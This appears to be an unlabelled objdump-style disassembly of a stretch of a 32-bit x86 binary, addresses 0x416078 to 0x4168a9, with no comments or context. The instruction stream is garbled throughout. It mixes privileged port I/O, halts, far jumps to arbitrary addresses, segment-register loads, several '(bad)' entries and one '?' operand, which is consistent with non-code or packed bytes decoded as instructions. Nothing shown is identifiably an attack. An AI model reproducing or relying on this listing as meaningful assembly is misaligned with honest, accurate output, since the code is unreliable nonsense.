  416078:	enter  0x6880,0x9
  41607c:	xchg   ebp,eax
  41607d:	in     al,dx
  41607e:	mov    al,BYTE PTR [esi-0x20658]
  416084:	and    DWORD PTR [ebp+edx*1+0x4],edi
  416088:	mov    BYTE PTR ds:0xe1ee8940,al
  41608e:	add    DWORD PTR [eax],eax
  416090:	cwde   
  416091:	jl     0x416016
  416093:	adc    BYTE PTR [ebp+eax*1-0x12e97500],dl
  41609a:	add    DWORD PTR [eax],eax
  41609c:	mov    BYTE PTR [edi+0xd],bh
  41609f:	add    al,BYTE PTR [eax]
  4160a1:	stos   BYTE PTR es:[edi],al
  4160a2:	add    bh,BYTE PTR [edi-0x71f97778]
  4160a8:	sbb    al,0x54
  4160aa:	add    eax,0x80817500
  4160af:	adc    DWORD PTR [eax],0x54
  4160b2:	add    eax,0xecd68900
  4160b7:	add    DWORD PTR [eax],eax
  4160b9:	dec    eax
  4160ba:	lds    ecx,FWORD PTR [eax-0x20bce52]
  4160c0:	jmp    FWORD PTR [esi]
  4160c2:	push   0x7e
  4160c4:	cvtps2pi mm4,xmm2
  4160c7:	add    DWORD PTR [ebx-0x21549],ecx
  4160cd:	push   ss
  4160ce:	ins    DWORD PTR es:[edi],dx
  4160cf:	hlt    
  4160d0:	add    ebx,esp
  4160d2:	push   0xe1218742
  4160d7:	jae    0x4160f4
  4160d9:	xor    eax,0x187501e2
  4160de:	imul   edi,DWORD PTR [esi+0xf],0x35
  4160e2:	loop   0x4160e5
  4160e4:	mov    DWORD PTR [edi-0x21000216],ebp
  4160ea:	mov    ds:0xe635ad7a,al
  4160ef:	add    DWORD PTR [eax],eax
  4160f1:	mov    eax,0x3103f470
  4160f6:	loop   0x416170
  4160f8:	test   DWORD PTR [ecx],ebx
  4160fa:	out    dx,al
  4160fb:	add    DWORD PTR [eax],eax
  4160fd:	stos   DWORD PTR es:[edi],eax
  4160fe:	jmp    0xd677:0x21afc8ff
  416105:	add    BYTE PTR [edx+0x15],dl
  416108:	jl     0x416111
  41610a:	add    edi,DWORD PTR [ebx+0x36]
  41610d:	out    0x78,eax
  41610f:	inc    BYTE PTR [esi+edi*8]
  416112:	mov    edx,0x2ddf7f2f
  416117:	xor    dh,BYTE PTR [edi-0x33]
  41611a:	mov    DWORD PTR [esi+0x6b76fe05],esp
  416120:	xor    al,0x82
  416122:	push   eax
  416123:	in     al,0xb2
  416125:	mov    dh,BYTE PTR [edi-0x26]
  416128:	inc    esp
  416129:	sti    
  41612a:	pop    esi
  41612b:	mov    bh,0x80
  41612d:	out    0x30,al
  41612f:	pop    ss
  416130:	ja     0x4160ff
  416132:	pop    ecx
  416133:	jle    0x41613a
  416135:	inc    BYTE PTR [esi+0x9]
  416138:	inc    esi
  416139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41613a:	(bad)  
  41613c:	out    dx,eax
  41613d:	add    esi,DWORD PTR [edx-0x40fd693e]
  416143:	adc    al,0xe3
  416145:	add    esi,DWORD PTR [ecx]
  416147:	xchg   BYTE PTR [eax],dl
  416149:	sti    
  41614a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41614b:	adc    dh,BYTE PTR [edx+0x7d]
  41614e:	es or  eax,0x8eb803e7
  416154:	iret   
  416155:	inc    DWORD PTR [esi]
  416157:	clc    
  416158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416159:	jp     0x416127
  41615b:	adc    al,0xe3
  41615d:	add    esi,DWORD PTR [ecx]
  41615f:	sub    BYTE PTR [ebp-0xd],0x32
  416163:	or     edi,esp
  416165:	js     0x416113
  416167:	adc    bl,ch
  416169:	add    eax,DWORD PTR [eax]
  41616b:	xor    DWORD PTR [ebx-0x8fcfe29],eax
  416171:	sub    DWORD PTR [ebx+0x3e],edi
  416174:	or     bl,BYTE PTR [ebp-0x19]
  416177:	xor    cl,BYTE PTR [ecx]
  416179:	out    0x8e,eax
  41617b:	sbb    DWORD PTR [ebp+eiz*2-0x18f6cd0d],eax
  416182:	jp     0x416138
  416184:	adc    bl,ah
  416186:	add    esi,DWORD PTR [ecx]
  416188:	dec    ecx
  416189:	jo     0x4161e0
  41618b:	cmp    cl,BYTE PTR ds:0x8ea803e7
  416191:	xlat   BYTE PTR ds:[ebx]
  416192:	dec    DWORD PTR [esi+0x1e7d62f7]
  416198:	or     eax,0x18ab03e7
  41619d:	jmp    0x600bd977
  4161a2:	adc    al,0x6e
  4161a4:	test   ebx,ebp
  4161a6:	pop    es
  4161a7:	xor    DWORD PTR [ecx],ecx
  4161a9:	cmp    al,0x1d
  4161ab:	test   al,0x8e
  4161ad:	xlat   BYTE PTR ds:[ebx]
  4161ae:	pop    es
  4161af:	xor    DWORD PTR [ecx],ecx
  4161b1:	add    BYTE PTR [eax-0x45],ah
  4161b4:	adc    BYTE PTR [ecx+ebp*8],al
  4161b7:	xor    cl,BYTE PTR [ecx-0x79]
  4161ba:	push   edi
  4161bb:	adc    DWORD PTR ds:0x8ea5e900,ecx
  4161c1:	adc    ch,ch
  4161c3:	xor    cl,BYTE PTR [ecx]
  4161c5:	mov    DWORD PTR [edi+0x45],esp
  4161c8:	or     eax,0x19ace900
  4161cd:	add    bl,BYTE PTR [ebx-0x7735cd00]
  4161d3:	fnstenv ds:0x32e51c87
  4161d9:	or     DWORD PTR [ebx+0x0],esi
  4161dc:	scas   al,BYTE PTR es:[edi]
  4161dd:	(bad)  
  4161de:	adc    ch,ah
  4161e0:	xor    cl,BYTE PTR [ecx]
  4161e2:	xchg   DWORD PTR [edi+0x4d],ebp
  4161e5:	or     eax,0x8e72e900
  4161ea:	scas   al,BYTE PTR es:[edi]
  4161eb:	in     eax,0x36
  4161ed:	or     DWORD PTR [eax],eax
  4161ef:	jo     0x41619c
  4161f1:	sbb    DWORD PTR [ecx+ebp*8],eax
  4161f4:	xor    al,BYTE PTR [eax+0x92ed186]
  4161fa:	add    BYTE PTR [ecx],bh
  4161fc:	adc    eax,0x2efd8bf6
  416201:	or     DWORD PTR [eax],eax
  416203:	pushf  
  416204:	dec    ebp
  416205:	add    BYTE PTR [esi+0x92ef9],0x70
  41620c:	stos   DWORD PTR es:[edi],eax
  41620d:	adc    DWORD PTR [ecx+ebp*8],eax
  416210:	xor    cl,BYTE PTR [ecx-0x79]
  416213:	inc    edi
  416214:	push   ecx
  416215:	or     eax,0x8fb5e900
  41621a:	adc    ch,ch
  41621c:	xor    cl,BYTE PTR [ecx]
  41621e:	mov    DWORD PTR [edi+0x1a],esp
  416221:	or     eax,0x2982e900
  416226:	call   FWORD PTR [esi+0x46]
  416229:	or     eax,0x71480000
  41622e:	adc    eax,0x419ce8b
  416233:	add    BYTE PTR [eax],al
  416235:	pop    eax
  416236:	test   DWORD PTR [esi+0xa4c18],eax
  41623c:	inc    eax
  41623d:	shl    DWORD PTR [edi+0xa48041c],0x85
  416244:	xchg   BYTE PTR [eax],ch
  416246:	push   cs
  416247:	add    BYTE PTR [eax],al
  416249:	xchg   ebx,eax
  41624a:	sbb    BYTE PTR [eax],0x4
  41624d:	or     BYTE PTR [edx],cl
  41624f:	shl    BYTE PTR [eax],1
  416251:	or     DWORD PTR [eax+0xa18041c],ebx
  416257:	jno    0x416272
  416259:	xchg   ebx,eax
  41625a:	adc    BYTE PTR [eax],0x4
  41625d:	or     BYTE PTR [edx],cl
  41625f:	test   DWORD PTR [esi+0x130],eax
  416265:	cwde   
  416266:	test   BYTE PTR [esi+0x9cc1c],ch
  41626c:	mov    DWORD PTR [esi+0x1a],ecx
  41626f:	add    al,0x0
  416271:	enter  0xb686,0x18
  416275:	fmul   QWORD PTR [ecx]
  416277:	add    al,dl
  416279:	imul   ebx,DWORD PTR cs:[ecx-0x3e],0xffffffc0
  41627e:	or     DWORD PTR [edi+0x560dec44],eax
  416284:	push   edi
  416285:	adc    esi,DWORD PTR [esi+0x24]
  416288:	adc    BYTE PTR [ebx],dl
  41628a:	std    
  41628b:	cmp    DWORD PTR [eax+0x73000988],eax
  416291:	je     0x416221
  416293:	sti    
  416294:	add    al,0xb
  416296:	adc    esi,DWORD PTR [edi]
  416298:	xchg   BYTE PTR [eax],al
  41629a:	ins    BYTE PTR es:[edi],dx
  41629b:	or     eax,0x50dc0000
  4162a0:	repz fdiv DWORD PTR [ebx]
  4162a3:	int    0x7f
  4162a5:	loopne 0x4162d8
  4162a7:	out    0x60,al
  4162a9:	xor    DWORD PTR [ecx-0x14],0xe029c25f
  4162b0:	cmp    al,0x86
  4162b2:	or     eax,0xc50001ec
  4162b7:	cld    
  4162b8:	xor    BYTE PTR ds:[ecx],0xe0
  4162bc:	add    DWORD PTR [ecx+0x34],esi
  4162bf:	arpl   di,bp
  4162c1:	add    cl,BYTE PTR [edx-0x11]
  4162c4:	add    BYTE PTR ds:[edx+eiz*8],dh
  4162c8:	add    DWORD PTR [edx+0x30],esi
  4162cb:	adc    edi,DWORD PTR ds:0x1e29c00
  4162d1:	jb     0x416303
  4162d3:	and    eax,ecx
  4162d5:	call   0xc0c47213
  4162da:	xor    dl,BYTE PTR [edx]
  4162dc:	in     al,dx
  4162dd:	es sti 
  4162df:	imul   edi,edi,0x55
  4162e2:	stos   BYTE PTR es:[edi],al
  4162e3:	and    al,0x8b
  4162e5:	fcomp  st(1)
  4162e7:	(bad)  
  4162e8:	sti    
  4162e9:	std    
  4162ea:	out    0x55,al
  4162ec:	dec    eax
  4162ed:	sbb    BYTE PTR [ebx],ch
  4162ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162f0:	pusha  
  4162f1:	pop    esi
  4162f2:	repz cli 
  4162f4:	add    DWORD PTR [ebp-0x27],edx
  4162f7:	out    dx,al
  4162f8:	sti    
  4162f9:	std    
  4162fa:	mov    BYTE PTR [ebx+0x3500c084],0xcc
  416301:	ret    
  416302:	or     BYTE PTR [ecx],dh
  416304:	scas   eax,DWORD PTR es:[edi]
  416305:	mov    WORD PTR [ebp+edx*2-0x16],ds
  416309:	push   esi
  41630a:	push   esi
  41630b:	mov    edx,0x49be8311
  416310:	out    0x1,al
  416312:	add    BYTE PTR [ecx],dh
  416314:	fwait
  416315:	adc    BYTE PTR [edx+ebp*1-0x4ffffe1f],al
  41631c:	test   DWORD PTR [ecx-0x18f6cf00],0x5b883674
  416326:	sub    BYTE PTR [ecx+0xd],cl
  416329:	pop    edx
  41632a:	ds pop ecx
  41632c:	cmp    al,0xd2
  41632e:	add    BYTE PTR [edi-0x80],bl
  416331:	mov    ch,0xeb
  416333:	and    eax,esi
  416335:	mov    esi,0xbfc3bb00
  41633a:	std    
  41633b:	dec    ebx
  41633c:	hlt    
  41633d:	scas   al,BYTE PTR es:[edi]
  41633e:	(bad)  
  41633f:	cmc    
  416340:	sub    al,0xff
  416342:	mov    WORD PTR [edi+0x3103e319],ds
  416348:	jg     0x4162ec
  41634a:	daa    
  41634b:	or     ah,BYTE PTR es:[eax+0x6f53de05]
  416352:	add    eax,0x7d78b14
  416357:	xor    DWORD PTR [ecx],ecx
  416359:	pusha  
  41635a:	mov    eax,ds:0x3e70d4d
  41635f:	pop    edi
  416360:	push   esi
  416361:	ret    0xc5
  416364:	sub    DWORD PTR [ecx],ecx
  416366:	push   0xffffffd0
  416368:	in     al,dx
  416369:	or     DWORD PTR [ebp-0x18f6d2e1],edx
  41636f:	mov    cs,WORD PTR [edx+eax*1-0x44]
  416373:	sbb    ch,BYTE PTR [eax+0x3107d78a]
  416379:	or     DWORD PTR [eax-0x77],esp
  41637c:	sub    DWORD PTR ds:0x827103e7,ecx
  416382:	push   ebp
  416383:	pop    ds
  416384:	sub    eax,0xb78ae709
  416389:	sbb    bl,ch
  41638b:	add    esi,DWORD PTR [ecx]
  41638d:	and    BYTE PTR [ebp+0x1b],0x35
  416391:	or     edi,esp
  416393:	lea    ebp,[ecx]
  416395:	pop    es
  416396:	xor    BYTE PTR [ecx],al
  416398:	jno    0x41631a
  41639a:	add    cl,ah
  41639c:	xor    esi,DWORD PTR [ebx+0x932e51c]
  4163a2:	jae    0x4163a4
  4163a4:	stos   BYTE PTR es:[edi],al
  4163a5:	mov    dl,BYTE PTR [eax]
  4163a7:	in     eax,0x32
  4163a9:	or     DWORD PTR [edi+0xd456f],eax
  4163af:	jmp    0xe5efefa6
  4163b4:	or     DWORD PTR cs:[eax],eax
  4163b7:	jo     0x416370
  4163b9:	sbb    BYTE PTR [ecx+ebp*8],al
  4163bc:	xor    al,BYTE PTR [edx+0x936d186]
  4163c2:	add    BYTE PTR [ecx-0x572e7df3],bh
  4163c8:	add    BYTE PTR [ebx],bl
  4163ca:	add    al,BYTE PTR [ecx-0x76a8cc55]
  4163d0:	lahf   
  4163d1:	or     eax,0x1686facb
  4163d6:	add    DWORD PTR [esi+0x936d9],0xffb12561
  4163e0:	call   0x6f406d17
  4163e5:	sbb    eax,0xbde9000d
  4163ea:	xchg   ebx,eax
  4163eb:	and    al,0xed
  4163ed:	xor    cl,BYTE PTR [ecx]
  4163ef:	jg     0x416443
  4163f1:	mov    ch,0x9
  4163f3:	add    cl,ch
  4163f5:	arpl   WORD PTR [ecx],dx
  4163f7:	or     ebp,0x62021116
  4163fd:	popa   
  4163fe:	sub    eax,0xc3ab9818
  416403:	call   0xfe361f86
  416408:	mov    esi,0x2b594e0c
  41640d:	xor    eax,0x35127f09
  416412:	push   es
  416413:	add    BYTE PTR [eax],al
  416415:	mov    BYTE PTR [eax+0x4],bh
  416418:	sub    esp,edx
  41641a:	sub    bl,BYTE PTR [eax]
  41641c:	add    DWORD PTR [ebx-0x77ff86fa],0x44290478
  416426:	and    DWORD PTR [eax],ebx
  416428:	mov    ebx,DWORD PTR [ecx+eiz*1]
  41642b:	sbb    BYTE PTR [ecx+0x0],dl
  41642e:	rol    ebx,cl
  416430:	call   0xfc34e6a1
  416435:	pop    edi
  416436:	push   cs
  416437:	push   0x640c257
  41643c:	ret    
  41643d:	xchg   BYTE PTR [eax],dh
  41643f:	add    DWORD PTR [eax],eax
  416441:	add    BYTE PTR [ecx+0x6],cl
  416444:	add    BYTE PTR [eax],al
  416446:	leave  
  416447:	out    dx,al
  416448:	add    BYTE PTR [eax],0x18
  41644b:	push   es
  41644c:	outs   dx,DWORD PTR ds:[esi]
  41644d:	dec    ecx
  41644e:	fwait
  41644f:	jb     0x416475
  416451:	sbb    BYTE PTR [edi+esi*2],dl
  416454:	inc    edx
  416455:	cmp    ecx,DWORD PTR [esi+0x1800042a]
  41645b:	jp     0x416497
  41645d:	call   0x3d5474
  416462:	xchg   ebx,eax
  416463:	(bad)  
  416464:	call   0xfc34f66c
  416469:	mov    ebx,DWORD PTR [esi]
  41646b:	fmulp  st(1),st
  41646d:	stc    
  41646e:	jg     0x416463
  416470:	mov    al,BYTE PTR [esp+esi*1+0x15]
  416474:	xchg   DWORD PTR [esi+0x9f8],ecx
  41647a:	inc    edx
  41647b:	xlat   BYTE PTR ds:[ebx]
  41647c:	and    al,0x1
  41647e:	fcmovbe st,st(7)
  416480:	add    al,dl
  416482:	scas   eax,DWORD PTR es:[edi]
  416483:	jge    0x416482
  416485:	inc    BYTE PTR [esi+0x16]
  416488:	add    al,0x0
  41648a:	cwde   
  41648b:	test   BYTE PTR [esi+0x1e43124],bl
  416491:	add    BYTE PTR [eax],al
  416493:	jmp    DWORD PTR [edx+ebx*2-0x7d1fd63e]
  41649a:	int    0x8e
  41649c:	loopne 0x416459
  41649e:	sbb    al,0x2d
  4164a0:	loopne 0x4164a3
  4164a2:	mov    ecx,DWORD PTR [esi]
  4164a4:	jmp    0x61eb7c21
  4164a9:	adc    al,0x4
  4164ab:	xor    eax,esp
  4164ad:	mov    al,BYTE PTR [esi+0x1e449]
  4164b3:	icebp  
  4164b4:	push   0xe02d1cae
  4164b9:	add    DWORD PTR [edi+0x5cfb7],eax
  4164bf:	xor    DWORD PTR [edi-0x7a],esp
  4164c2:	sbb    BYTE PTR ds:0x218a01e0,dh
  4164c8:	fmulp  st(7),st
  4164ca:	(bad)  
  4164cb:	repz jp 0x4164e2
  4164ce:	jmp    esp
  4164d0:	test   BYTE PTR ds:0x19153100,0x89
  4164d7:	scas   eax,DWORD PTR es:[edi]
  4164d8:	rol    BYTE PTR ds:0x86793100,cl
  4164de:	sbb    BYTE PTR ds:0xa84001e2,ch
  4164e4:	xor    BYTE PTR [eax],ah
  4164e6:	add    al,0x31
  4164e8:	loop   0x416474
  4164ea:	xchg   BYTE PTR [ecx-0x1a],al
  4164ed:	add    DWORD PTR [eax],eax
  4164ef:	mov    edx,0x31041c60
  4164f4:	loop   0x4164c7
  4164f6:	and    BYTE PTR [eax],al
  4164f8:	sbb    ch,BYTE PTR [eax+0x28]
  4164fb:	add    al,0x31
  4164fd:	loop   0x416574
  4164ff:	jb     0x4164bb
  416501:	and    eax,ecx
  416503:	call   0x205c831
  416508:	popa   
  416509:	or     DWORD PTR [edi],ecx
  41650b:	xchg   esi,eax
  41650c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41650d:	lock push ds
  41650f:	mov    DWORD PTR [edi+0x3103eb19],esi
  416515:	xor    eax,0xe7f096bb
  41651b:	add    ecx,DWORD PTR [esi+0x3107d786]
  416521:	or     DWORD PTR [eax-0x62],esp
  416524:	push   ebp
  416525:	add    eax,0xf3f603e7
  41652a:	add    esi,DWORD PTR [bx+di]
  41652d:	or     DWORD PTR [edx+0x1c],ebx
  416530:	mov    al,0x5d
  416532:	or     ebx,DWORD PTR [ebx+esi*1]
  416535:	test   BYTE PTR [ebx],dh
  416537:	sub    BYTE PTR [ecx],bh
  416539:	pop    ebx
  41653a:	jb     0x416509
  41653c:	pop    ecx
  41653d:	gs sar ah,0x44
  416541:	push   eax
  416542:	adc    eax,0xdfcad85f
  416547:	add    esi,DWORD PTR [esi+0x3106e7f3]
  41654d:	or     DWORD PTR [ecx],ebx
  41654f:	or     BYTE PTR [esi+0x45],cl
  416552:	retf   
  416553:	sbb    ebx,DWORD PTR [esi+0x317ee7f4]
  416559:	or     ecx,edi
  41655b:	push   0x0
  41655d:	push   esi
  41655e:	inc    ebp
  41655f:	ret    
  416560:	sbb    edi,DWORD PTR [eax+0x631bcb54]
  416566:	test   BYTE PTR [ebp+0x66f23eeb],bl
  41656c:	cld    
  41656d:	mov    WORD PTR [edi-0x44],cs
  416570:	pop    eax
  416571:	repz add bh,ah
  416574:	add    bl,BYTE PTR [edi+0x3103e30c]
  41657a:	jbe    0x41655c
  41657c:	mov    BYTE PTR [edi+0x3103e318],dh
  416582:	add    BYTE PTR [eax],0x6f
  416585:	sbb    al,BYTE PTR ds:0x8872e900
  41658b:	scas   al,BYTE PTR es:[edi]
  41658c:	add    eax,0x70000939
  416591:	lods   al,BYTE PTR ds:[esi]
  416592:	sbb    BYTE PTR [ecx+ebp*8],al
  416595:	xor    al,BYTE PTR [edx+0x92ef186]
  41659b:	add    BYTE PTR [ecx],bl
  41659d:	push   edx
  41659e:	lock mov ebx,0x92edd
  4165a4:	jl     0x4165c1
  4165a6:	add    BYTE PTR [esi+0x92ed9],0x70
  4165ad:	mov    bl,0x10
  4165af:	add    al,0xe9
  4165b1:	xor    cl,BYTE PTR [ecx-0x79]
  4165b4:	xchg   DWORD PTR [ecx],edi
  4165b6:	add    eax,0x86a5e900
  4165bb:	adc    ch,ch
  4165bd:	xor    cl,BYTE PTR [ecx]
  4165bf:	mov    DWORD PTR [edi+0x0],esp
  4165c2:	and    eax,0x62e90005
  4165c7:	sub    BYTE PTR [ecx+0x52111115],cl
  4165cd:	jb     0x4165ca
  4165cf:	loope  0x4165a5
  4165d1:	mov    eax,ds:0x375ded2a
  4165d6:	js     0x416628
  4165d8:	ret    0x32e1
  4165db:	add    BYTE PTR [ebp+ecx*8+0xe],0x84
  4165e0:	nop
  4165e1:	jmp    0xb33f5480
  4165e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e7:	add    eax,0x7732e904
  4165ec:	pop    ss
  4165ed:	jb     0x4165ab
  4165ef:	std    
  4165f0:	add    ebp,ecx
  4165f2:	xor    dh,BYTE PTR [eax]
  4165f4:	mov    edi,0xbf2031df
  4165f9:	sub    esi,DWORD PTR [ecx]
  4165fb:	or     DWORD PTR [ecx],ebp
  4165fd:	add    BYTE PTR [ecx],bl
  4165ff:	or     BYTE PTR [eax],al
  416601:	push   0x4c20ad9
  416606:	enter  0xc037,0xc2
  41660a:	int3   
  41660b:	or     bh,BYTE PTR [edi-0x14]
  41660e:	test   al,0x57
  416610:	push   ecx
  416611:	mov    esi,DWORD PTR [esi+ecx*1-0x3084a9e0]
  416618:	xchg   ecx,esi
  41661a:	fistp  QWORD PTR [ebp+0x5c]
  41661d:	and    al,0x68
  41661f:	jge    0x41667d
  416621:	and    al,0x90
  416623:	sub    eax,0x8c0008ae
  416628:	or     al,BYTE PTR [eax]
  41662a:	ud2    
  41662c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41662d:	add    BYTE PTR [eax],al
  41662f:	pop    eax
  416630:	fild   WORD PTR [edi]
  416632:	lea    ebp,[esi+ecx*1+0xa480000]
  416639:	mov    DWORD PTR [esp+ebp*1+0x5],esp
  41663d:	xchg   DWORD PTR [esi-0x211a4],eax
  416643:	aad    0x81
  416645:	add    BYTE PTR [eax+0x49],ch
  416648:	or     dh,BYTE PTR [edi]
  41664a:	enter  0x19fe,0x87
  41664e:	mov    fs,WORD PTR [esi+ebp*8]
  416651:	std    
  416652:	call   DWORD PTR [ebx]
  416654:	lds    esi,FWORD PTR [esi+0x4]
  416657:	repz (bad) 
  416659:	out    0xb,eax
  41665b:	repz les eax,FWORD PTR [ecx]
  41665e:	add    BYTE PTR [eax],ah
  416660:	add    al,0x0
  416662:	jmp    0x41667e
  416664:	aaa    
  416665:	ror    BYTE PTR [ebx+0x40296],0x8
  41666c:	add    esi,DWORD PTR [esi+0x45b7e711]
  416672:	add    DWORD PTR [ebx+0x3e],esp
  416675:	xchg   esi,eax
  416676:	add    al,0x31
  416678:	imul   eax,DWORD PTR ds:0x8afdaa8a,0xc
  41667f:	mov    dh,0x7a
  416681:	jg     0x41668b
  416683:	sub    eax,0x870d01e0
  416688:	iret   
  416689:	or     dh,BYTE PTR [esi-0x711e8f00]
  41668f:	dec    esp
  416690:	(bad)  
  416691:	fisttp DWORD PTR [esi+0x1e42d96]
  416697:	add    BYTE PTR [eax+0x30b784eb],ch
  41669d:	loopne 0x4166a0
  41669f:	add    BYTE PTR [eax],dh
  4166a1:	jbe    0x4166a0
  4166a3:	add    esi,DWORD PTR [ecx]
  4166a5:	loopne 0x4166ab
  4166a7:	mov    gs,WORD PTR [ecx]
  4166a9:	fadd   QWORD PTR [ecx]
  4166ab:	add    BYTE PTR [edx+0x3103fd65],ch
  4166b1:	loopne 0x41663f
  4166b3:	enter  0x5e1a,0x8
  4166b7:	add    al,0x31
  4166b9:	loopne 0x41663d
  4166bb:	div    DWORD PTR [ecx]
  4166bd:	dec    eax
  4166be:	add    DWORD PTR [eax],eax
  4166c0:	(bad)  
  4166c1:	fimul  WORD PTR [ecx-0x79]
  4166c4:	scas   eax,DWORD PTR es:[edi]
  4166c5:	(bad)  
  4166c7:	(bad)  
  4166c8:	ds clc 
  4166ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166cb:	or     BYTE PTR ds:0xb30d01e0,ch
  4166d1:	sbb    bh,dh
  4166d3:	std    
  4166d4:	es js  0x416717
  4166d7:	and    al,0x61
  4166d9:	pop    eax
  4166da:	add    al,0x65
  4166dc:	xor    dl,ah
  4166de:	cmp    al,0xc2
  4166e0:	xchg   esp,ebx
  4166e2:	mov    dl,BYTE PTR [ebp+ecx*2-0x4e]
  4166e6:	in     al,dx
  4166e7:	pop    es
  4166e8:	mov    dl,0x7a
  4166ea:	add    DWORD PTR ds:0x1a8af,ecx
  4166f0:	add    BYTE PTR [ecx],dh
  4166f2:	or     esi,esi
  4166f4:	mov    cl,0x72
  4166f6:	or     esi,ebp
  4166f8:	mov    cl,0x6a
  4166fa:	or     ah,BYTE PTR [edx+0x40]
  4166fd:	scas   eax,DWORD PTR es:[edi]
  4166fe:	add    eax,0x30b93862
  416703:	inc    edx
  416704:	or     DWORD PTR [ebp+0x3103e8b8],ebp
  41670a:	and    BYTE PTR [ebp+0x24],0x2d
  41670e:	or     edi,esp
  416710:	xchg   BYTE PTR ds:0x4d402dfc,dh
  416716:	or     eax,0x9310be7
  41671b:	sar    BYTE PTR [esi-0x69dd0dd],cl
  416721:	dec    eax
  416722:	lock jnp 0x416754
  416725:	mov    edx,0x7e6be784
  41672a:	in     al,dx
  41672b:	mov    dl,0x81
  41672d:	sub    eax,0xe703e705
  416732:	adc    BYTE PTR [edx-0x7f],dh
  416735:	xor    eax,0x1803e705
  41673a:	icebp  
  41673b:	pop    ebp
  41673c:	add    BYTE PTR [eax],cl
  41673e:	icebp  
  41673f:	ret    0x1807
  416742:	icebp  
  416743:	push   0xe86131c0
  416748:	add    ecx,DWORD PTR [eax+0x7]
  41674b:	cli    
  41674c:	clc    
  41674d:	test   al,0x3
  41674f:	bound  esi,QWORD PTR [edi]
  416751:	jmp    0x4a52d3
  416756:	push   0x66cc1ac6
  41675b:	push   ebp
  41675c:	retf   
  41675d:	daa    
  41675e:	lahf   
  41675f:	add    eax,0x1d554f60
  416764:	ret    0x34fc
  416767:	test   DWORD PTR [ecx],ebx
  416769:	add    esi,DWORD PTR [ecx]
  41676b:	or     DWORD PTR [eax],eax
  41676d:	fs xchg ebp,eax
  41676f:	or     BYTE PTR [eax],al
  416771:	jmp    0x130ce9a8
  416776:	cmc    
  416777:	or     DWORD PTR [ebp+eax*1+0x41],0x32
  41677c:	dec    esp
  41677d:	or     eax,0x1384fe09
  416782:	xor    cl,BYTE PTR [ecx]
  416784:	add    BYTE PTR [edx+0x6e],dh
  416787:	and    eax,0xec2e7310
  41678c:	aaa    
  41678d:	popf   
  41678e:	das    
  41678f:	or     DWORD PTR [ecx-0x46eab163],ecx
  416795:	jmp    0x4167c9
  416797:	or     DWORD PTR [eax],eax
  416799:	xchg   ebp,eax
  41679a:	xor    cl,BYTE PTR ss:[esi-0x2146933]
  4167a1:	fimul  WORD PTR [edi]
  4167a3:	mov    edi,0x8232e900
  4167a8:	push   esp
  4167a9:	lds    eax,FWORD PTR [edx+0x32]
  4167ac:	fidivr DWORD PTR [edx+0x53]
  4167af:	or     BYTE PTR [ebx-0x15],0xbd
  4167b3:	loopne 0x4167de
  4167b5:	push   ebp
  4167b6:	adc    DWORD PTR [ecx],esp
  4167b8:	mov    ah,BYTE PTR ds:0x3a092800
  4167be:	call   0x28826aa4
  4167c3:	or     cl,bh
  4167c5:	jb     0x416782
  4167c7:	mov    edx,0xabd5243c
  4167cc:	pop    esp
  4167cd:	and    al,0x1
  4167cf:	cli    
  4167d0:	into   
  4167d1:	or     eax,0xa1465
  4167d6:	jmp    0xf965b546
  4167db:	mov    WORD PTR [ecx+edx*2+0x38],es
  4167df:	stos   BYTE PTR es:[edi],al
  4167e0:	mov    ebx,0xed0b5be8
  4167e5:	std    
  4167e6:	add    BYTE PTR [ebx-0x7cefdbbf],al
  4167ec:	pop    ecx
  4167ed:	and    al,0x18
  4167ef:	sbb    DWORD PTR [edi-0x79],edx
  4167f2:	into   
  4167f3:	push   ebx
  4167f4:	fucomp st(0)
  4167f6:	lahf   
  4167f7:	push   edx
  4167f8:	repnz sti 
  4167fa:	sub    eax,DWORD PTR [eax-0x2bdbb382]
  416800:	pop    es
  416801:	jmp    0xc52417be
  416806:	dec    esi
  416807:	pop    es
  416808:	loopne 0x416791
  41680a:	ins    BYTE PTR es:[edi],dx
  41680b:	xor    al,0x1d
  41680d:	mov    ebp,0xc27fcafa
  416812:	shl    eax,0x11
  416815:	inc    ecx
  416817:	fwait
  416818:	sub    ah,BYTE PTR [eax+edx*1]
  41681b:	xchg   ebx,eax
  41681c:	into   
  41681d:	jbe    0x416825
  41681f:	add    BYTE PTR [ecx],dl
  416821:	inc    ecx
  416822:	and    al,0x18
  416824:	xor    edi,DWORD PTR [edi]
  416826:	aaa    
  416827:	mov    ?,WORD PTR [edx+ebp*8-0x3]
  41682b:	inc    DWORD PTR ds:0x13514f2c
  416831:	ret    
  416832:	call   0xfc34ca9a
  416837:	mov    esp,DWORD PTR [ecx+ebp*1]
  41683a:	adc    BYTE PTR [ebx+0x24447f80],cl
  416840:	pusha  
  416841:	pop    eax
  416842:	push   eax
  416843:	mov    ebp,DWORD PTR [esi+0x6ffa50de]
  416849:	repz xchg eax,ecx
  41684c:	and    eax,eax
  41684e:	xchg   DWORD PTR [esp+0x1d],ebp
  416852:	mov    eax,0x2a9fb2ab
  416857:	test   ecx,0xc1c1ca7e
  41685d:	adc    bh,bh
  41685f:	leave  
  416860:	xor    edi,ebx
  416862:	retf   0x7d39
  416865:	les    edx,FWORD PTR [ecx]
  416867:	jb     0x41689e
  416869:	ja     0x4168b8
  41686b:	and    al,0x25
  41686d:	jns    0x4168bc
  41686f:	and    al,0x19
  416871:	imul   edx,DWORD PTR [ebp+0x24],0x7e4d41
  416878:	pop    ecx
  416879:	loope  0x41687c
  41687b:	cmp    DWORD PTR [edi-0x2900021d],esi
  416881:	leave  
  416882:	sbb    DWORD PTR [ecx-0x2344900],ecx
  416888:	inc    esi
  41688a:	push   es
  41688b:	cld    
  41688c:	jbe    0x4168c3
  41688e:	pop    ss
  41688f:	cld    
  416890:	jmp    0x803d6fba
  416895:	jbe    0x416876
  416897:	imul   edi,edi,0x30ff16a6
  41689d:	sahf   
  41689e:	jbe    0x4168a3
  4168a0:	mov    DWORD PTR [ebp+0x59],edx
  4168a3:	mov    al,BYTE PTR [esi+0x1e451]
  4168a9:	xor    bl,BYTE PTR [ebx]
